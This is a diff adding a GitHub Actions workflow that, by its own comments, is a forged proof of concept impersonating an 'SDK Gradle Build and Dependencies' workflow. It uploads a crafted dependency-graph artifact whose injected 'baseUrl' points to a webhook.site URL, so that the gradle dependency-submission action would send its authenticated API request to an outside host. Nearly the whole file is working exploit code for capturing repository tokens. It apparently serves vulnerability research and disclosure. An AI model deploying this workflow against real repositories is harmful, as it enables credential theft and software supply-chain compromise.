@@ -1,0 +1,37 @@
+# Forged workflow impersonating "SDK Gradle Build and Dependencies".
+# Demonstrates that the attacker-chosen dependency-graph JSON is passed straight
+# into octokit.request() by gradle/actions/dependency-submission (download-and-submit).
+name: SDK Gradle Build and Dependencies
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build a dependency-graph artifact carrying a hostile octokit parameter
+        run: |
+          mkdir -p dependency-graph-reports
+          cat > dependency-graph-reports/poc2.json <<'JSON'
+          {
+            "version": 1,
+            "sha": "2f00ba0170b523deea26b8b4d777cd45bc68b035",
+            "ref": "refs/heads/main",
+            "job": {"id": "poc", "correlator": "poc"},
+            "detector": {"name": "poc", "version": "1", "url": "https://example.invalid"},
+            "scanned": "2026-11-05T00:00:00Z",
+            "manifests": {},
+            "baseUrl": "https://webhook.site/fe52c9f5-bfff-47ef-b6a5-f3766fda186a"
+          }
+          JSON
+          echo marker > keep.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dependency-graph_poc2.json
+          path: |
+            dependency-graph-reports/poc2.json
+            keep.txt
+          retention-days: 1
